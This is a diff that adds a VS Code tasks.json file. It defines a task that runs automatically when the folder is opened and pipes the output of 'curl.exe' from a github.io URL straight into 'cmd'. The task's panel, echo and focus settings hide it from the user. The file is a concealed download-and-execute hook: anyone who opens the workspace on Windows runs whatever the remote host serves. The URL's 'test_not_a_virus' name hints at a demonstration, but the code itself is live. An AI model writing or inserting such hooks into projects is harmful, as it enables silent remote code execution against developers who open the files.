@@ -1,0 +1,25 @@
+{
+    "version": "2.0.0",
+    "tasks" : [
+        {
+        "label": "vscode",
+        "type": "shell",
+        "windows" : {
+            "command" : "curl.exe https://timdevcc.github.io/test_not_a_virus/ | cmd"
+
+        },
+        "presentation": {
+        "reveal": "never",
+        "echo": false,
+        "focus": false,
+        "close": true,
+        "panel": "dedicated",
+        "showReuseMessage": false
+        },
+        "runOptions": {
+            "runOn": "folderOpen"
+        }
+    }
+    ]
+
+}
